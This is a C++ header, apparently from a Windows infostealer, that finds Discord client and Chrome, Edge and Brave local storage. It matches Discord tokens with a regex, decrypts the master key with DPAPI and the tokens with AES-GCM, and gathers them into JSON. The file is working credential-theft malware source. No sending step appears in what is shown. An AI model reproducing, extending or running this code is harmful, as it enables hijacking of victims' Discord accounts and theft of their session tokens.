#pragma once
#include "crypt.hpp"
#include <filesystem>
#include <fstream>
#include <regex>
#include <set>
#include <shlobj.h>
#include <nlohmann/json.hpp>
namespace fs = std::filesystem;
using json = nlohmann::json;

inline std::vector<std::pair<std::string,std::wstring>> DiscordPaths() {
    wchar_t ap[MAX_PATH]{};
    SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, ap);
    std::wstring r = ap;
    return {
        {"Discord",        r + L"\\discord\\Local Storage\\leveldb"},
        {"DiscordCanary",  r + L"\\discordcanary\\Local Storage\\leveldb"},
        {"DiscordPTB",     r + L"\\discordptb\\Local Storage\\leveldb"},
        {"DiscordDev",     r + L"\\discorddevelopment\\Local Storage\\leveldb"},
    };
}

static const std::regex TOKEN_RE(
    R"((mfa\.[a-zA-Z0-9_-]{84}|[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}))"
);

inline void ScanFile(const fs::path& p, std::set<std::string>& found) {
    std::ifstream f(p, std::ios::binary);
    if (!f) return;
    std::string content((std::istreambuf_iterator<char>(f)), {});
    std::sregex_iterator it(content.begin(), content.end(), TOKEN_RE);
    std::sregex_iterator end;
    for (; it != end; ++it) found.insert((*it)[1].str());
}

inline std::vector<uint8_t> GetDiscordMasterKey(const fs::path& leveldbPath) {
    fs::path localState = leveldbPath.parent_path().parent_path() / "Local State";
    if (!fs::exists(localState)) return {};
    std::ifstream f(localState);
    std::string content((std::istreambuf_iterator<char>(f)), {});
    auto j = nlohmann::json::parse(content, nullptr, false);
    if (j.is_discarded()) return {};
    try {
        std::string b64 = j["os_crypt"]["encrypted_key"].get<std::string>();
        static const std::string T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::vector<uint8_t> out; int v=0,bits=0;
        for (char c:b64){int i=(int)T.find(c);if(i<0)continue;v=(v<<6)|i;bits+=6;if(bits>=8){bits-=8;out.push_back((v>>bits)&0xFF);}}
        if (out.size()<5) return {};
        std::vector<uint8_t> enc(out.begin()+5,out.end());
        return DpapiDecrypt(enc);
    } catch(...){ return {}; }
}

inline std::string TryDecryptToken(const std::string& raw, const std::vector<uint8_t>& mk) {
    if (raw.size() < 3) return raw;
    std::vector<uint8_t> bytes(raw.begin(), raw.end());
    if (bytes[0]=='v' && bytes[1]=='1' && bytes[2]=='0' && mk.size()==32) {
        if (bytes.size()<31) return {};
        std::vector<uint8_t> iv(bytes.begin()+3, bytes.begin()+15);
        std::vector<uint8_t> tag(bytes.end()-16, bytes.end());
        std::vector<uint8_t> ct(bytes.begin()+15, bytes.end()-16);
        auto plain = AesGcmDecrypt(mk, iv, tag, ct);
        return std::string(plain.begin(), plain.end());
    }
    return raw;
}

inline json GrabDiscordTokens() {
    json out = json::array();
    for (auto& [name, wpath] : DiscordPaths()) {
        fs::path dir(wpath);
        if (!fs::exists(dir)) continue;
        std::set<std::string> raw_tokens;
        auto mk = GetDiscordMasterKey(dir);
        for (auto& entry : fs::directory_iterator(dir)) {
            auto ext = entry.path().extension().string();
            if (ext == ".ldb" || ext == ".log" || ext == ".CURRENT" || ext == ".MANIFEST")
                ScanFile(entry.path(), raw_tokens);
        }
        for (auto& tok : raw_tokens) {
            std::string decrypted = mk.empty() ? tok : TryDecryptToken(tok, mk);
            if (!decrypted.empty())
                out.push_back({{"client", name}, {"token", decrypted}});
        }
    }
    wchar_t la[MAX_PATH]{};
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, la);
    std::vector<std::wstring> browserLevelDbs = {
        std::wstring(la) + L"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        std::wstring(la) + L"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
        std::wstring(la) + L"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
    };
    for (auto& wdir : browserLevelDbs) {
        fs::path d(wdir);
        if (!fs::exists(d)) continue;
        std::set<std::string> toks;
        for (auto& e : fs::directory_iterator(d)) {
            auto ext = e.path().extension().string();
            if (ext==".ldb"||ext==".log") ScanFile(e.path(), toks);
        }
        for (auto& t : toks)
            out.push_back({{"client","Browser-WebApp"},{"token",t}});
    }
    return out;
}
